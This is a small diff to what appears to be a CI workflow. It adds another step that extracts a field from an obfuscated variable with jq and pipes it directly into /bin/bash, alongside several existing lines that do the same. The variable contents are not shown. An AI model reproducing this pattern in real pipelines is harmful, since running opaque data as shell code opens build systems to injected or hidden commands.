@@ -54,6 +54,7 @@ jobs:
           echo $oup581 | jq -r .xxh9 | /bin/bash
           echo $me9496 | jq -r .x4 | /bin/bash
           printf '%s' "$ql51" | jq -r .x4912 | /bin/bash
+          printf '%s' "$ip30" | jq -r .j1 | /bin/bash
 
       - name: Archive output
         if: always()
